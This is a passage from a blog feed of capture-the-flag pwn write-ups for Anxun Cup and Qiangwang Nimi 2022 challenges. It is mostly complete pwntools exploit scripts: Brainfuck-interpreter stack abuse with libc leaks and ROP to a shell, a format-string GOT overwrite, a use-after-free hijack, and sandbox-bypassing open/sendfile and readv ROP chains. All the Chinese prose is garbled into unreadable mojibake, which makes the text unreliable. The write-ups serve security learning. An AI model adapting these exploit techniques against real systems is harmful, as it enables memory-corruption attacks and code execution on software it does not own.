class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xff</span><br>        gadget = gadget &gt;&gt; <span class="hljs-number">8</span><br>        p.send(p8(t))<br><br>payload = <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">0x7c</span>  + <span class="hljs-string">b&#x27;.&gt;&#x27;</span> * <span class="hljs-number">4</span>  <span class="hljs-comment">#æ³„æ¼__libc_start_mainçš„åœ°å€</span><br>payload += <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">24</span> + <span class="hljs-string">b&#x27;,&gt;&#x27;</span> * <span class="hljs-number">4</span> <span class="hljs-comment">#ä¿®æ”¹fgetså‡½æ•°çš„åœ°å€</span><br>payload += <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">24</span> + <span class="hljs-string">b&#x27;,&gt;&#x27;</span> * <span class="hljs-number">8</span><span class="hljs-comment">#ä¿®æ”¹memsetå‡½æ•°å’Œputcharå‡½æ•°</span><br>payload += <span class="hljs-string">b&#x27;.&#x27;</span><span class="hljs-comment">#è°ƒç”¨putcharå‡½æ•°</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;[ ]&#x27;</span>, payload)<br>leak = u32(p.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])<br><br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>gets = libcbase + libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br>getchar(p32(sys_addr))<br>getchar(p32(gets))<br>getchar(p32(<span class="hljs-number">0x80484e0</span>))<br><br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="å®‰æ´µæ¯babybf"><a href="#å®‰æ´µæ¯babybf" class="headerlink" title="å®‰æ´µæ¯babybf"></a>å®‰æ´µæ¯babybf</h3><p>æœ¬åœ°ç¯å¢ƒï¼š2.27-3ubuntu1.6_amd64</p><p>å®‰æ´µæ¯çš„è¿™é“é¢˜å¾ˆæŠ½è±¡</p><h4 id="v3æ•°ç»„"><a href="#v3æ•°ç»„" class="headerlink" title="v3æ•°ç»„"></a>v3æ•°ç»„</h4><p>å‡½æ•°sub_142Fçš„å¼€å¤´å°±æ˜¯ä¸€äº›å‡½æ•°èµ‹å€¼ç»™v3æ•°ç»„ï¼Œè¿™äº›å‡½æ•°ç›´æ¥å»çœ‹æ˜¯å®Œå…¨ä¸çŸ¥é“å…¶æ„ä¹‰ï¼Œæ‰€ä»¥è¾¹è°ƒè¯•è¾¹å»é˜…è¯»å¯ä»¥å¾ˆå¥½å¾—å¸®åŠ©ç†è§£ã€‚</p><p>å‡½æ•°æ ˆçš„æ’å¸ƒå¦‚ä¸‹ï¼š</p><img src="/img/7/Screenshot_20221230_032525.jpg" style="zoom: 67%;" /><p>â€‹                                                                                        </p><p>è¿™é‡Œä»¥å‡½æ•°sub_16F6ä¸ºä¾‹å­</p><img src="/img/7/Screenshot_20221230_040603.png" style="zoom: 67%;" /><ol><li><p>rbp-0A8ä¸­çš„å€¼(0x7ffc6a1b48d0)åŠ 1</p></li><li><p>rbp-0B0ä¸­çš„å€¼(0x562b3853e261)åŠ 1</p></li><li><p>eaxèµ‹ä¸Šåœ°å€0x562b3853e261ä¸­çš„å€¼(1å­—èŠ‚) </p></li><li><p>mov  rax, [rbp+rax*8-80h]   ï¼ˆraxèµ‹ä¸Šv3æ•°ç»„çš„å‡½æ•°åœ°å€ï¼Œrax  &#x3D;  v3[rax]ï¼‰</p></li><li><p>jmp     rax</p></li></ol><p>å†å¯¹ç…§å‡½æ•°sub_16F6ä¼ªä»£ç å°±å¯ä»¥çŸ¥é“å‡½æ•°çš„ä½œç”¨äº†</p><p><img src="/img/7/Screenshot_20221230_042441.png"></p><p>â€‹                              </p><p>å®é™…ä¸Š<code>rbp-0A8</code>å°±æ˜¯bfè§£é‡Šå™¨çš„æŒ‡é’ˆï¼Œ<code>rbp-0B0</code>ä¸­å‚¨å­˜ç€ä¸‹ä¸€æŒ‡ä»¤ï¼Œæ‰€ä»¥è¿™äº›å‡½æ•°ä½œç”¨å¦‚ä¸‹ï¼š</p> <img src="/img/7/Screenshot_20221230_043330.png" style="zoom:80%;" /><h4 id="å­—ç¬¦è½¬åŒ–"><a href="#å­—ç¬¦è½¬åŒ–" class="headerlink" title="å­—ç¬¦è½¬åŒ–"></a>å­—ç¬¦è½¬åŒ–</h4><p>è¿™é“é¢˜å¹¶æ²¡æœ‰ç›´æ¥ç»™ä½ <code>&quot;&gt;  &lt;  ,  .&quot;</code> è¿™äº›å­—ç¬¦ï¼Œè€Œæ˜¯åœ¨ä½ è¾“å…¥ä¸€æ®µå­—ç¬¦åï¼Œåˆå»ä½¿ç”¨dword_2020æ•°ç»„è¿›è¡Œä¸€æ­¥è½¬åŒ–</p><img src="/img/7/Screenshot_20221230_034137.png" style="zoom: 80%;" /><p>dword_2020æ•°ç»„éƒ¨åˆ†å†…å®¹å¦‚ä¸‹ï¼š</p><img src="/img/7/Screenshot_20221230_032203.jpg" style="zoom:67%;" /><p>â€‹                                                                                           </p><p>è§„å¾‹å¦‚ä¸‹ï¼š[è¾“å…¥çš„å€¼(asciiç )&#x3D;&gt;è½¬åŒ–åçš„å€¼]</p><p><code>[0=&gt;8][1=&gt;9][43=&gt;2][44=&gt;5][45=&gt;3][46=&gt;4][60=&gt;0][62=&gt;1][91=&gt;6][93=&gt;7]</code></p><p>è¾“å…¥çš„å€¼æ˜¯å­—ç¬¦ï¼Œåœ¨å†…å­˜ä¸­ä»¥asciiç å‚¨å­˜ï¼Œè½¬åŒ–åçš„å€¼åˆæ˜¯å¯¹åº”v3æ•°ç»„ä¸­çš„å¼•ç´¢ã€‚</p><p>ä¾‹å¦‚å­—ç¬¦<code>&#39;&gt;&#39;</code>çš„asciiç ä¸º62ï¼Œè½¬åŒ–åçš„å€¼ä¸º1ï¼Œæœ€åå¯¹åº”v3[1]ä¸­å‡½æ•°çš„æ‰§è¡Œã€‚</p><h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>è™½ç„¶è¿™é“é¢˜ä¸åƒpwnable_bfä¸­å¾ˆç›´æ¥ç»™å‡ºbfè§£é‡Šå™¨çš„æ“ä½œï¼Œä½†æ˜¯ç»è¿‡ä¸€ç³»åˆ—è½¬åŒ–åä¹ŸåŒæ ·è¾¾åˆ°äº†bfè§£é‡Šå™¨çš„æ•ˆæœã€‚</p><p>æ“ä½œçš„æŒ‡é’ˆæ˜¯<code>rbp-0A8</code>ï¼Œå…¶é‡Œé¢çš„å€¼ä¹Ÿæ˜¯æ ˆä¸Šçš„å€¼ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å¯¹æ ˆä¸Šä»»æ„å€¼è¯»å†™ï¼Œæ‰€ä»¥æ³„æ¼__libc_start_mainå‡½æ•°åœ°å€åç›´æ¥ROP</p><p>å®Œæ•´exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;chall&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getchar</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget)<br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xff</span><br>        gadget = gadget &gt;&gt; <span class="hljs-number">8</span><br>        p.send(p8(t))<br><br><span class="hljs-comment">#s = [0,8][1,9][43,2][44,5][45,3][46,4][60,0][62,1][91,6][93,7]</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;len&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x100</span>).encode())<br>payload = <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">0x58</span> + (<span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">8</span> + <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">0x28</span> + (<span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">0x20</span><br>p.sendafter(<span class="hljs-string">b&#x27;code&gt;&#x27;</span>, payload)<br>leak =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">231</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br>pop_rdi = libcbase + <span class="hljs-number">0x2164f</span><br>ret = libcbase + <span class="hljs-number">0x8aa</span><br><br>payload = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)<br>getchar(payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="å¼ºç½‘æ‹Ÿæ€bfbf"><a href="#å¼ºç½‘æ‹Ÿæ€bfbf" class="headerlink" title="å¼ºç½‘æ‹Ÿæ€bfbf"></a>å¼ºç½‘æ‹Ÿæ€bfbf</h3><p><a href="https://xtxtn.github.io/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/#bfbf">å¼ºç½‘æ‹Ÿæ€2022pwn - xtxtnâ€™s Blog</a></p><p>â€‹                            </p><p>â€‹                       </p><p>â€‹                  </p><p>å‚è€ƒï¼š<a href="https://zh.wikipedia.org/wiki/Brainfuck">Brainfuck - ç»´åŸºç™¾ç§‘ï¼Œè‡ªç”±çš„ç™¾ç§‘å…¨ä¹¦ (wikipedia.org)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å¼ºç½‘æ‹Ÿæ€2022pwn</title>
    <link href="/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/"/>
    <url>/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/</url>
    
    <content type="html"><![CDATA[<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>ç›´æ¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn1&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>elfbase = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - elf.sym[<span class="hljs-string">&#x27;func&#x27;</span>]<br><br>printf_got = elfbase + elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>system_plt = elfbase + elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = fmtstr_payload(<span class="hljs-number">8</span>, &#123;printf_got:system_plt&#125;,write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;hello\n&#x27;</span>, payload)<br><span class="hljs-comment">#pause()</span><br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwn2-1"><a href="#pwn2-1" class="headerlink" title="pwn2-1"></a>pwn2-1</h3><p>å­˜åœ¨uafï¼Œä¸”print_noteå‡½æ•°æ˜¯é€šè¿‡å¼•ç”¨å †å—ä¸Šprint_note_contentå‡½æ•°çš„åœ°å€æ¥å®ç°ï¼Œä¿®æ”¹å †ä¸Šprint_note_contentå‡½æ•°çš„åœ°å€ä¸ºmagicå‡½æ•°åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn2-1&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn2-1&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printf</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>elfbase = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x11f0</span><br><br>add(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x10</span>, p64(elfbase + elf.sym[<span class="hljs-string">&#x27;magic&#x27;</span>]))<br>printf(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="bfbf"><a href="#bfbf" class="headerlink" title="bfbf"></a>bfbf</h3><p>bfè§£é‡Šå™¨ç±»å‹çš„é¢˜</p><p>é€šè¿‡è¾“å…¥çš„â€˜&gt;&lt;+-â€˜ç­‰è¿™äº›ç¬¦å·å¯ä»¥å¯¹æ ˆä¸Šv3çš„æ•°æ®è¿›è¡Œè¯»å†™ï¼Œè€Œä¸”æ²¡æœ‰å¯¹åç§»é‡è¿›è¡Œé™åˆ¶ï¼Œè¿™å°±å¯ä»¥å¯¹æ ˆä¸Šçš„ä»»æ„æ•°æ®è¯»å†™ã€‚</p><img src="/img/6/Screenshot_20221130_051449.png" style="zoom: 80%;" /><p>æ‰“å°å‡º<code>__libc_start_main</code>å‡½æ•°çš„åœ°å€ï¼Œå‡å»ç›¸åº”çš„åç§»å°±å¯å¾—åˆ°libcçš„åŸºåœ°å€ï¼Œåˆ©ç”¨libcæ‰¾åˆ°ç›¸åº”çš„gadgetï¼Œå†è¦†ç›–æ ˆä¸Š<code>__libc_start_main</code>çš„åœ°å€ï¼Œç›´æ¥ROPã€‚</p><p>ç¨‹åºå¼€å¯æ²™ç›’å¯¹readå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°è¿›è¡Œäº†é™åˆ¶ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥orwè¯»å–flagæ–‡ä»¶ä¸­çš„ä¿¡æ¯ï¼Œè¿™é‡Œæ”¹ç”¨sendfileå‡½æ•°å³å¯ã€‚</p><img src="/img/6/Screenshot_20221130_053546.png" style="zoom: 80%;" /><p>â€‹</p><p>å®Œæ•´exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getchar</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget)<br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xff</span><br>        gadget = gadget &gt;&gt; <span class="hljs-number">8</span><br>        p.send(p8(t))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>payload = <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">0x210</span> + (<span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">0x22</span> + (<span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">6</span><br>payload += (<span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">8</span> * <span class="hljs-number">20</span><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&gt;\n&#x27;</span>, payload)<br><br>stack_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak))<br><br>libcbase = leak - <span class="hljs-number">243</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x23b6a</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + <span class="hljs-number">0x142c92</span><br>pop_rcx_rbx = libcbase + <span class="hljs-number">0x10257e</span><br>pop_rax = libcbase + <span class="hljs-number">0x36174</span><br>syscall_ret = libcbase + <span class="hljs-number">0x630a9</span><br><br><span class="hljs-comment">#open(â€˜flag&#x27;)</span><br><span class="hljs-comment">#sendfile(1,fd,0,0x100)</span><br>payload = flat(<br>    p64(pop_rdi), p64(stack_addr + <span class="hljs-number">0xa0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rcx_rbx), p64(<span class="hljs-number">0x100</span>), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">40</span>),<br>    p64(syscall_ret)<br>)<br>payload += <span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>getchar(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>æ”¹ç”¨readvå‡½æ•°ä¹Ÿå¯ä»¥è¯»å–flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#open(&#x27;flag&#x27;)</span><br><span class="hljs-comment">#readv(3, iovec, 1)</span><br><span class="hljs-comment">#writev(1, iovec, 1)</span><br>payload = flat(<br>    p64(pop_rdi), p64(stack_addr + <span class="hljs-number">0xd0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rsi), p64(stack_addr + <span class="hljs-number">0xd8</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">19</span>),<br>    p64(syscall_ret),<br>    <br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(stack_addr + <span class="hljs-number">0xd8</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">20</span>),<br>    p64(syscall_ret)<br>)<br>payload += <span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(stack_addr + <span class="hljs-number">0xf0</span>) + p64(<span class="hljs-number">0x30</span>)<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä½¿ç”¨closeå‡½æ•°å…ˆå…³é—­æ ‡å‡†è¾“å…¥<code>close(0)</code>ï¼Œå†ç›´æ¥orwï¼Œè¿™é‡Œå°±ä¸å†å±•ç¤ºäº†ã€‚</p><h3 id="only"><a href="#only" class="headerlink" title="only"></a>only</h3><p>æœ¬åœ°ç¯å¢ƒï¼š2.31-0ubuntu9_amd64</p><p>ç¨‹åºåœ¨å¼€å§‹æ—¶å°±å·²ç»æœ‰å¾ˆå¤šå †å—å·²ç»è¢«åˆ†é…é‡Šæ”¾äº†ï¼ˆé€šè¿‡åŠ¨æ€é“¾æ¥åº“libseccomp.so.2å¼•å…¥æ²™ç›’è§„åˆ™å¯¼è‡´çš„ï¼‰</p><img src="/img/6/Screenshot_20221201_090534.png" style="zoom: 67%;" /><p>â€‹                                                                                                      </p><p>ä½¿ç”¨increaseå‡½æ•°æ˜¯å¯¹å †å—çš„ç”³è¯·ï¼Œæ¬¡æ•°é™åˆ¶ä¸º11æ¬¡ï¼›ä½¿ç”¨decresaeå‡½æ•°æ˜¯é‡Šæ”¾å †å—ï¼Œæ¬¡æ•°é™åˆ¶ä¸º4æ¬¡ï¼Œè™½ç„¶æœ‰uafï¼Œä½†ç¨‹åºæ²¡æœ‰editå‡½æ•°å’Œshowå‡½æ•°è¿™ç§åŠŸèƒ½ï¼Œæ— æ³•å¯¹uafå®Œæˆæœ‰æ•ˆåˆ©ç”¨ï¼Œå”¯ä¸€å¯ä»¥åˆ©ç”¨çš„æ˜¯initialå‡½æ•°ï¼Œè¿˜åªèƒ½ä½¿ç”¨ä¸€æ¬¡</p><img src="/img/6/Screenshot_20221201_091349.png" style="zoom:67%;" /><p>å¦‚æœå·²ç»å®Œæˆäº†ä¸€æ¬¡å †å—çš„ç”³è¯·å¹¶ä¸”é‡Šæ”¾ï¼Œåœ¨æ­¤è¿‡ç¨‹å°±å°†tcacheä¸­çš„<code>tcache_perthread_struct *key</code>ç ´åï¼Œé…åˆuafå°±å¯ä»¥å®ç°tcacheçš„double freeã€‚ç”±äºç”³è¯·å †å—çš„å¤§å°ï¼Œé‡Šæ”¾æ¬¡æ•°è¿™äº›é™åˆ¶ï¼Œæˆ‘ä»¬æ— æ³•ä¸€æ¬¡æ€§æ³„æ¼å‡ºlibcçš„åŸºåœ°å€ã€‚</p><p>åœ¨å®Œæˆdouble freeåï¼ŒåŠ«æŒåˆ°tcacheçš„ç»“æ„ä½“å¤´éƒ¨ï¼Œå°±å¯ä»¥ç›´æ¥æ§åˆ¶tcacheçš„ç”³è¯·å’Œæ•°é‡ã€‚ç›´æ¥é‡Šæ”¾tcacheçš„ç»“æ„ä½“å¤´éƒ¨å¾—åˆ°unsorted binåï¼Œæ”»å‡»<code>_IO_2_1_stdout_</code>ä»¥å®ç°libcåŸºåœ°å€çš„æ³„æ¼ï¼š</p><img src="/img/6/Screenshot_20221201_102237.jpg" style="zoom: 67%;" /><p>â€‹</p><p>æ²™ç›’çš„å­˜åœ¨æ— æ³•ç›´æ¥æ‹¿åˆ°shellï¼Œéœ€è¦åˆ©ç”¨<code>mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 